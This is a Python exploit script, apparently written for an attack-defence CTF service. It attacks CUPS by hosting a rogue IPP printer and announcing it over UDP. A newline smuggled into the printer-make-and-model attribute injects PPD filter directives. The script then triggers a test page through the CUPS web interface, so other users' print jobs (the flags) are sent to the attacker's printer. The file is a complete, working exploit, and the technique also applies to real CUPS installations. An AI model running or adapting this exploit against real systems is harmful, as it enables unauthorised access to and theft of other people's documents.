import random
import socket
import string
import sys
import time
from pathlib import Path

import requests

sys.path.append(str(Path(__file__).absolute().parent.parent))
sys.path.append(str(Path(__file__).absolute().parent.parent / 'service'))

from exploits.evilprinter import StdoutPrinter, host_printer_in_background
from ipp.ipp_message import IppMessage


class EvilPrinter(StdoutPrinter):
    """A printer that returns custom attributes on IPP get-printer-attributes requests"""

    def __init__(self, name='EvilPrinter', custom_attributes: dict = {}) -> None:
        super().__init__(name)
        self.custom_attributes = custom_attributes

    def get_printer_attributes(self, msg: IppMessage) -> IppMessage:
        msg = super().get_printer_attributes(msg)
        msg.printers[0].update(self.custom_attributes)
        return msg


def get_my_ip(target: str) -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((target, 631))
        return s.getsockname()[0]
    finally:
        s.close()


def announce_printer_udp(target_ip: str, prefix: str, url: str) -> None:
    printer_type = 0x00
    printer_state = 0x03
    printer_location = 'Saarsec HQ'
    message = f'{printer_type:x} {printer_state:x} {url} "{printer_location}" "{prefix}"'.encode('utf-8')

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(message, (target_ip, 631))
    print('Message to CUPS sent.')


def print_test_page_cups_webinterface(target: str, printer_name: str) -> None:
    url = f'http://{target}:631/printers/{printer_name}'
    s = requests.Session()
    r = s.get(url)
    print(r)
    r = s.post(url, data={
        'org.cups.sid': r.cookies['org.cups.sid'],
        'OP': 'print-test-page'
    })
    print(r)


def exploit(target: str, flag_ids: list[str]):
    print('=== This exploit does not work against the docker container ===')
    print('===       Please try it against the real vulnbox VM         ===')

    custom_ppd = [
        '*cupsFilter2: "application/vnd.cups-pdf application/pdf 0 add_template.py"'
    ]
    for target_username in flag_ids:
        custom_ppd.append(f'*saarsecFilterTemplate: "/home/rent-a-printer/data/{target_username}/job-00001.pdf"')

    # we'll inject the ppd commands through printer-make-and-model attribute
    ppd = '\n'.join(custom_ppd)[:-1]  # without last '"' (which is already part of the original attribute)
    printer = EvilPrinter(name='evilprinter', custom_attributes={
        'printer-make-and-model': 'saarsec exploit-printer"\n' + ppd
    })
    port = random.randint(10000, 65000)
    host_printer_in_background(printer, port)

    prefix = 'EvilPrinter' + ''.join(random.choice(string.ascii_uppercase) for _ in range(10))
    my_ip = get_my_ip(target)
    announce_printer_udp(target, prefix, f'ipp://{my_ip}:{port}/printers/evilprinter')
    printer_name = prefix + '_' + my_ip.replace('.', '_')
    print('printer name: ' + printer_name)

    time.sleep(3)

    print_test_page_cups_webinterface(target, printer_name)

    # wait for flags to arrive at our printer
    time.sleep(7)


if __name__ == '__main__':
    exploit(sys.argv[1], sys.argv[2].split(','))
